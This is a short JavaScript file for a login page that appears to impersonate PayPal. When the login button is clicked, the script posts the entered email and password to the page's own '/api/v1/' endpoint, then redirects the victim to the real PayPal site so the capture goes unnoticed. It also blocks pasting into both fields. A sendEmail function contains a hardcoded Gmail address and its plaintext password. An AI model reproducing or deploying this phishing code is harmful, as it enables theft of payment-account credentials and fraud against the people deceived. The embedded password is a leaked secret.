
const email = document.getElementById("email")
const password = document.getElementById("password")
const loginBtn = document.getElementById("login")
const signUpBtn = document.getElementById("signup")
const forgetBtn = document.getElementById("forget")

window.onload = () => {
    email.onpaste = e => e.preventDefault();
    password.onpaste = e => e.preventDefault();
}

function postCredentials(email, password) {
    var myHeaders = new Headers();
    myHeaders.append("Content-Type", "application/json");

    var raw = JSON.stringify({
        "email": email,
        "password": password
    });

    var requestOptions = {
        method: 'POST',
        headers: myHeaders,
        body: raw,
        redirect: 'follow'
    };

    fetch("/api/v1/", requestOptions)
        .then(response => response.text())
        .then(result => console.log(result))
        .catch(error => console.log('error', error));
}

function sendEmail() {
    Email.send({
        Host: "smtp.gmail.com",
        Username: "leviopunga@gmail.com",
        Password: "baraka14",
        To: 'leviincognito@gmail.com',
        From: "leviopunga@gmail.com",
        Subject: "Sending Email using javascript",
        Body: "Well that was easy!!",
    })
        .then(function(message) {
            alert("mail sent successfully")
        });
}

loginBtn.addEventListener("click", function() {
    postCredentials(email.value, password.value)
    window.location.replace("https://www.paypal.com/us/home");
})

forgetBtn.addEventListener("click", function() {
    window.location.replace("https://www.paypal.com/authflow/password-recovery/");
})

signUpBtn.addEventListener("click", function() {
    window.location.replace("https://www.paypal.com/us/webapps/mpp/account-selection/");
})








